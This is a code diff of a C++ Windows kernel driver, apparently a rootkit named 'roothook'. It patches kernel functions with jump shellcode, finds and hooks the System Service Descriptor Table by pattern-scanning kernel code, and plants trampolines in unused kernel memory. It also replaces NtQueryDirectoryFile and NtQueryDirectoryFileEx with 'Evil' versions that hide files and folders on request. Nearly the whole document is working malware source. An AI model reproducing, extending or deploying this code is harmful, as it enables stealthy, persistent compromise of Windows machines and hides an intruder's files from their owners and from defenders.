@@ -1,94 +1,9 @@
+#include <intrin.h>
 #include "hooking.h"
 #include "HookingGlobals.h"
 #pragma warning(disable : 4996)
 #pragma warning(disable : 4302)
 #pragma warning(disable : 4311)
-
-
-/*
-NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, ULONG Tag) {
-	// Example call for driver function:    roothook::KernelFunctionHook(&roothook::HookHandler, "\\SystemRoot\\System32\\drivers\\dxgkrnl.sys", "NtQueryCompositionSurfaceStatistics", NULL);
-	// Example call for kernel function:    roothook::KernelFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", NULL);
-	ULONG64 ReplacementValue = 0;
-	NTSTATUS Status = STATUS_UNSUCCESSFUL;
-	UNICODE_STRING TargetName = { 0 };
-	ANSI_STRING AnsiTargetName = { 0 };
-	PVOID TargetFunction = NULL;
-	BYTE ShellCode[] = { 0x90, 0x90, 0x90, 0x90, 0x90,   // nop ; nop ; nop ; nop ; nop (filled to pad to full insts) 
-						0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, evilfunction
-									0x41, 0xff, 0xe5 };  // jmp r13 (jmp evilfunction)
-	PVOID TrampolineBuffer = NULL;
-
-
-	// Check for invalid parameters:
-	if (HookingFunction == NULL) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (HookingFunction = NULL)\n");
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_INVALID_PARAMETER;
-	}
-
-	
-	// Get the address of the target function:
-	if (ModuleName == NULL) {
-		RtlInitAnsiString(&AnsiTargetName, RoutineName);
-		Status = RtlAnsiStringToUnicodeString(&TargetName, &AnsiTargetName, TRUE);
-		if (!NT_SUCCESS(Status)) {
-			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-			DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (cannot get RoutineName in UNICODE_STRING format: 0x%x)\n", Status);
-			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-			return STATUS_UNSUCCESSFUL;
-		}
-		TargetFunction = MmGetSystemRoutineAddress(&TargetName);
-		if (TargetFunction == NULL) {
-			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-			DbgPrintEx(0, 0, "KMDFdriver Hooking - Kernel function hook failed (cannot get address of kernel function %wZ)\n", &TargetName);
-			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-			return STATUS_INVALID_ADDRESS;
-		}
-	}
-	else {
-		TargetFunction = SystemModuleExportMEM(ModuleName, RoutineName);
-		if (TargetFunction == NULL) {
-			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-			DbgPrintEx(0, 0, "KMDFdriver Hooking - Driver function hook failed (failed getting the driver function base address)\n");
-			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-			return STATUS_INVALID_ADDRESS;
-		}
-	}
-
-	
-	// Allocate trampoline pool, copy trampoline template into pool and change the afterhookaddr field to afterhookaddr:
-	Status = InitiateTrampolinePool(Tag, &TrampolineBuffer, (ULONG64)TargetFunction + sizeof(ShellCode));
-	if (!NT_SUCCESS(Status)) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to initiate trampoline pool: 0x%x)\n", Status);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return Status;
-	}
-
-
-	// Prepare the shellcode for deployment and write it into memory:
-	ReplacementValue = (ULONG64)HookingFunction;
-	RtlCopyMemory((PVOID)((ULONG64)ShellCode + 7 * sizeof(BYTE)), &ReplacementValue, sizeof(ReplacementValue));
-	if (!WriteToReadOnlyMemoryMEM(TargetFunction, &ShellCode, sizeof(ShellCode), TRUE)) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to patch the original system function)\n");
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_UNSUCCESSFUL;
-	}
-	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-	if (Tag == 'HkQr') {
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook SUCCESS, hook is at %p\n", OriginalNtQueryDirFile);
-	}
-	else {
-		// For now the only other one is 'HkQx' for NtQueryDirectoryFileEx:
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook SUCCESS, hook is at %p\n", OriginalNtQueryDirFileEx);
-	}
-	DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-	return STATUS_SUCCESS;
-}
-*/
 
 
 NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, BOOL ToSave, ULONG Tag) {
@@ -222,17 +137,19 @@ ULONG64 roothook::SSDT::CurrentSSDTFuncAddr(ULONG SyscallNumber) {
 
 
 ULONG64 roothook::SSDT::GetServiceDescriptorTable() {
-	BYTE* SearchStartAddress = (BYTE*)__readmsr(0xC0000082);
-	BYTE* SearchEndAddress = (BYTE*)(((ULONG64)SearchStartAddress + PAGE_SIZE) & (~0x0FFF));  // Scan until a page after the starting address + allign the end address to PAGE_SIZE (0x1000)
-	PULONG MatchingCodeAddress = NULL;
-	while (SearchStartAddress < SearchEndAddress){
-		if ((*(PULONG)SearchStartAddress & 0xFFFFFF00) == 0x83f70000){
-			MatchingCodeAddress = (PULONG)(SearchStartAddress - 12);
-			return (ULONG64)MatchingCodeAddress + (((*(PULONG)MatchingCodeAddress) >> 24) + 7) + (ULONG64)(((*(PULONG)(MatchingCodeAddress + 1)) & 0x0FFFF) << 8);
+	ULONG64  KiSystemCall64 = __readmsr(0xC0000082);	// Get the address of nt!KeSystemCall64
+	ULONG64  KiSystemServiceRepeat = 0;
+	INT32 Limit = 4096;
+	for (int i = 0; i < Limit; i++) {
+		if (*(PUINT8)(KiSystemCall64 + i) == 0x4C
+			&& *(PUINT8)(KiSystemCall64 + i + 1) == 0x8D
+			&& *(PUINT8)(KiSystemCall64 + i + 2) == 0x15){
+			KiSystemServiceRepeat = KiSystemCall64 + i;  // Got stub of ServiceDescriptorTable from KiSystemServiceRepeat refrence
+			return (ULONG64)(*(PINT32)(KiSystemServiceRepeat + 3) + KiSystemServiceRepeat + 7);	 // Convert relative address to absolute address
 		}
-		SearchStartAddress++;
 	}
-	return NULL;  // Stub was not found in the range searched
+
+	return NULL;
 }
 
 
@@ -242,7 +159,7 @@ ULONG roothook::SSDT::GetOffsetFromSSDTBase(ULONG64 FunctionAddress) {
 }
 
 
-NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag, PUNICODE_STRING SystemServiceName){
+NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag){
 	/*
 	Business logic of hook:
 	1) Get address of ServiceDescriptorTable with specific pattern matching in the kernel code section (.text)
@@ -267,7 +184,6 @@ NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag, P
 	KIRQL CurrentIRQL = NULL;
 	ULONG SyscallNumber = 0;
 	ULONG SSDTEntryValue = 0;
-	ULONG TextSectionSize = 0;
 
 
 	// Check for invalid parameters:
@@ -310,7 +226,7 @@ NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag, P
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
 		return STATUS_NOT_FOUND;
 	}
-	if (KernelTextSection == NULL) {
+	if (KernelTextSection == NULL || TextSectionSize == 0) {
 		KernelTextSection = (BYTE*)memory_helpers::GetTextSectionOfSystemModuleADD(KernelImageBaseAddress, &TextSectionSize);
 	}
 	if (KernelTextSection == NULL) {
@@ -330,7 +246,7 @@ NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag, P
 	TrampolineSection = memory_helpers::FindUnusedMemoryADD(KernelTextSection, TextSectionSize, sizeof(DummyTrampoline));
 	if (TrampolineSection == NULL) {
 		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find sequence of %lu bytes that are nop/int3 instructions, %p, %lu)\n", SyscallNumber, sizeof(DummyTrampoline), KernelTextSection, TextSectionSize);
+		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find sequence of %zu bytes that are nop/int3 instructions, %p, %lu)\n", SyscallNumber, sizeof(DummyTrampoline), KernelTextSection, TextSectionSize);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
 		return STATUS_NOT_FOUND;
 	}
@@ -340,7 +256,7 @@ NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag, P
 	KernelModuleDescriptor = IoAllocateMdl(TrampolineSection, sizeof(DummyTrampoline), 0, 0, NULL);
 	if (KernelModuleDescriptor == NULL){
 		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot allocate module descriptor to write into the kernel image, %p, %lu)\n", SyscallNumber, TrampolineSection, sizeof(DummyTrampoline));
+		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot allocate module descriptor to write into the kernel image, %p, %zu)\n", SyscallNumber, TrampolineSection, sizeof(DummyTrampoline));
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
 		return STATUS_MEMORY_NOT_ALLOCATED;
 	}
@@ -460,7 +376,7 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 	case RKOP_HIDEFILE:
 		// hide file/folder -
 
-		DbgPrintEx(0, 0, "Request Type: hide file/folder (0xFFFFFFFFFFFFFFFF = hide, 0x7777FFFFFFFFFFFF = return list, else = remove by index (value = index),\nActual reserved value: %p", RootkInstructions->Reserved);
+		DbgPrintEx(0, 0, "Request Type: hide file/folder (0xFFFFFFFFFFFFFFFF = hide, 0x7777FFFFFFFFFFFF = return list, else = remove by index (value = index),\nActual reserved value: %p\n", RootkInstructions->Reserved);
 		
 		// Handle additional preoperation dependencies:
 		if ((ULONG64)RootkInstructions->Reserved == HIDE_FILE) {
@@ -554,58 +470,16 @@ NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
 
 	IO_STATUS_BLOCK DirStatus = { 0 };
 	QueryDirFile OgNtQueryDirectoryFile = NULL;
-	//PVOID OriginalQueryDirFile = NULL;
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	BOOL IsDirSame = TRUE;
 	BOOL IsSystemRoot = TRUE;
 	PVOID HandleInfo = NULL;
 	
 
+	// Call the original NtQueryDirectoryFile:
 	OgNtQueryDirectoryFile = (QueryDirFile)ActualNtQueryDirFile;
 	Status = OgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
 		Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
-	//Status = NtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length,
-	//	FileInformationClass, ReturnSingleEntry * SL_RETURN_SINGLE_ENTRY + RestartScan * SL_RESTART_SCAN, FileName);
-	/*
-	// Find NtQueryDirectoryFile base:
-	OriginalQueryDirFile = MmGetSystemRoutineAddress(&QueryUnicode);
-	if (OriginalQueryDirFile == NULL) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile failed (cannot get address of original NtQueryDirectoryFile)\n");
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
-		return STATUS_UNSUCCESSFUL;
-	}
-
-
-	// Unhook NtQueryDirectoryFile:
-	if (!WriteToReadOnlyMemoryMEM(OriginalQueryDirFile, OriginalNtQueryDirFile, sizeof(DEFAULT_SHELLCODE), TRUE)) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile failed (cannot unhook original NtQueryDirectoryFile), unhook data: %p\n", OriginalNtQueryDirFile);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
-		return STATUS_UNSUCCESSFUL;
-	}
-
-
-	// Call original NtQueryDirectoryFile and re-hook it:
-	OgNtQueryDirectoryFile = (QueryDirFile)OriginalQueryDirFile;
-	Status = OgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
-		Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
-	if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", FALSE, 'HkQr'))) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile failed (cannot rehook NtQueryDirectoryFile)\n");
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
-		return STATUS_UNSUCCESSFUL;
-	}
-	*/
-
-
-	/*
-	// Call original NtQueryDirectoryFile:
-	OgNtQueryDirectoryFile = (QueryDirFile)OriginalNtQueryDirFile;
-	Status = OgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
-		Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
-	*/
-
 	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
 		//DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
 		//DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile: actual NtQueryDirectoryFile failed with 0x%x\n", Status);
@@ -668,61 +542,20 @@ NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
 	BOOL IsDirSame = TRUE;
 	BOOL IsSystemRoot = TRUE;
 	PVOID HandleInfo = NULL;
-	PVOID OriginalQueryDirFileEx = NULL;
 	UNICODE_STRING QueryUnicode = { 0 };
 
-
+	
+	// Call the original NtQueryDirectoryFile:
 	OgNtQueryDirectoryFileEx = (QueryDirFileEx)ActualNtQueryDirFileEx;
 	Status = OgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
-		Length, FileInformationClass, FileName);
-
-	/*
-	// Find NtQueryDirectoryFile base:
-	OriginalQueryDirFileEx = MmGetSystemRoutineAddress(&QueryUnicode);
-	if (OriginalQueryDirFileEx == NULL) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx failed (cannot get address of original NtQueryDirectoryFileEx)\n");
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
-		return STATUS_UNSUCCESSFUL;
-	}
-
-
-	// Unhook NtQueryDirectoryFileEx:
-	if (!WriteToReadOnlyMemoryMEM(OriginalQueryDirFileEx, OriginalNtQueryDirFileEx, sizeof(DEFAULT_SHELLCODE), TRUE)) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx failed (cannot unhook original NtQueryDirectoryFileEx)\n");
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
-		return STATUS_UNSUCCESSFUL;
-	}
-
-
-	// Call original NtQueryDirectoryFileEx and re-hook it:
-	OgNtQueryDirectoryFileEx = (QueryDirFileEx)OriginalQueryDirFileEx;
-	Status = OgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
 		Length, FileInformationClass, QueryFlags, FileName);
-	if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFileEx, NULL, "NtQueryDirectoryFileEx", FALSE, 'HkQx'))) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx failed (cannot rehook NtQueryDirectoryFileEx)\n");
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
-		return STATUS_UNSUCCESSFUL;
-	}
-	*/
-
-
-	/*
-	// Call original NtQueryDirectoryFileEx:
-	OgNtQueryDirectoryFileEx = (QueryDirFileEx)OriginalNtQueryDirFileEx;
-	Status = OgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
-		Length, FileInformationClass, QueryFlags, FileName);
-		*/
-
-
 	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
 		//DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
 		//DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx: actual NtQueryDirectoryFileEx failed with 0x%x\n", Status);
 		//DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
 		return Status;
 	}
+
 
 	// Allocate buffer for handle path (format - "\nosusfolder\verysus\...\actualsearchdir) and get the handle path:
 	HandleInfo = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'KfHi');
